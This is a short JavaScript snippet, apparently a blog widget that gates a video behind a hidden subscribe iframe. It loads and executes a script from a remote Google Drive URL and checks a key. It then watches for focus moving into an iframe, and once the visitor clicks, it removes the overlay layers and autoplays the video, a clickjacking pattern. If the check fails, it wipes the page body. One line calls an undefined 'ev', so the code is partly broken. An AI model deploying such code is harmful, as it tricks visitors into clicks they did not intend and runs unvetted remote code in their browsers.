var url = "https://googledrive.com/host/0B52-9uAkQ1sTb2c1RVF1UXhtZEU";
$.getScript( url, function() {
if(externaljs=='0B52-9uAkQ1sTT1ZxMGVsUXlDeU0'){ 

$("#clickiframe").ready(function() {
var monitor = setInterval(function(){
		var elem = document.activeElement;
		if(elem && elem.tagName == 'IFRAME')
			{
				setTimeout(function(){
					$("#subscribe").remove();
					$("#divlayer").remove();
				}, 500);
				$(document).ready(function() {
					$("#bg123")[0].src += "&autoplay=1;&showinfo=0";
					ev.preventDefault();
				});
					clearInterval(monitor);
			}
		}, 100);
	});

}else{
 setTimeout(function(){$('body').remove();}, 500);
  }  
});
